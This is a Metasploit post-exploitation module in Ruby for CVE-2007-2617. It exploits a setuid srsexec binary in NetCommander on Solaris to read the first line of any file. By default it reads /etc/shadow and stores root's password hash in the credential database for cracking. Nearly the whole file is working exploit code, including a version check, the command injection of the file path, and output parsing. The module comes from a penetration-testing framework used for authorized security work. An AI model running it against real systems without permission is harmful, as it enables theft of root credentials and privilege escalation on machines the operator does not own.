##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Solaris::System
  include Msf::Post::Solaris::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Solaris srsexec Arbitrary File Reader',
        'Description'   => %q{ This module exploits a vulnerability in NetCommander 3.2.3 and 3.2.5.
                               When srsexec is executed in debug (-d) verbose (-v) mode,
                               the first line of an arbitrary file can be read due to the suid bit set.
                               The most widely accepted exploitation vector is reading /etc/shadow,
                               which will reveal root's hash for cracking.},
        'License'       => MSF_LICENSE,
        'Author'        => [
          'h00die', # metasploit module
          'iDefense' # discovery reported anonymously to https://labs.idefense.com
        ],
        'Platform'      => [ 'solaris' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'References'    => [
          ['CVE', '2007-2617'],
          ['URL', 'https://download.oracle.com/sunalerts/1000443.1.html'],
          ['URL', 'https://www.securityfocus.com/archive/1/468235'],
          ['EDB', '30021'],
          ['BID', '23915']
        ],
        'DisclosureDate' => 'May 07 2007',
      ))
    register_options([
        OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow'])
      ])
  end

  def suid_bin_path
    '/opt/SUNWsrspx/bin/srsexec'
  end

  def check
    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    # This ls is based on the guidance in the sun alerts article
    unin = cmd_exec '/usr/bin/ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh'
    unin =~ /UninstallNetConnect\.([\d\.]{11})\.sh/
    unless $1
      print_error 'NetConnect uninstall not found, either not installed or too new'
      return false
    end

    version = Gem::Version.new($1.split(".").map(&:to_i).join('.'))
    unless version.between?(Gem::Version.new('3.2.3'), Gem::Version.new('3.2.4'))
      print_error "#{version} is not vulnerable"
      return false
    end
    print_good "#{version} is vulnerable"

    unless setuid? suid_bin_path
      vprint_error "#{suid_bin_path} is not setuid, it must have been manually patched"
      return false
    end

    true
  end

  def run
    unless check
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    flag = Rex::Text.rand_text_alpha 5
    output = cmd_exec("#{suid_bin_path} -dvb #{datastore['FILE']} #{flag}")
    vprint_good("Raw Command Output: #{output}")

    # The first line of the file is cut at 20 characters.
    # If the output is longer than 20 characters, then
    # the next line will start with the last 2 characters from the previous line,
    # followed by the next 18 characters.

    formatted_output = output.scan(/binaries file line: (.+)$/).flatten.map { |line|
      (line.length == 20) ? line[0..17] : line
    }.join

    return if formatted_output.empty?

    print_good("First line of #{datastore['FILE']}: #{formatted_output}")

    return unless datastore['FILE'] == '/etc/shadow'
    print_good("Adding root's hash to the credential database.")
    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      workspace_id: myworkspace.id,
      post_reference_name: self.fullname,
      username: formatted_output.split(':')[0],
      private_data: formatted_output.split(':')[1],
      private_type: :nonreplayable_hash
    }
    create_credential(credential_data)
  end
end
